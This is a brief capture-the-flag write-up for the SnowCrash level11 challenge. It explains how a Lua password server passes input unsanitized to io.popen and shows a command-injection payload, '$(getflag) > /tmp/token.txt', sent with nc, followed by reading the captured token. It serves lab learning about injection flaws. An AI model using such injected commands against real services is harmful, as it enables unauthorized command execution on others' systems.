In the home directory you have the file `level11.lua`, understanding a little bit the code, we can see that its just a server which asks for a password and then checks it by processing it with `sha1sum`, supposing that it's running as a daemon, we can exploit the `io.popen` which launches a system command by calling `getflag` and saving it to a file:

``` shell
level11@SnowCrash:~$ nc localhost 5151
Password: $(getflag) > /tmp/token.txt
Erf nope..
```

``` shell
cat /tmp/token.txt
```

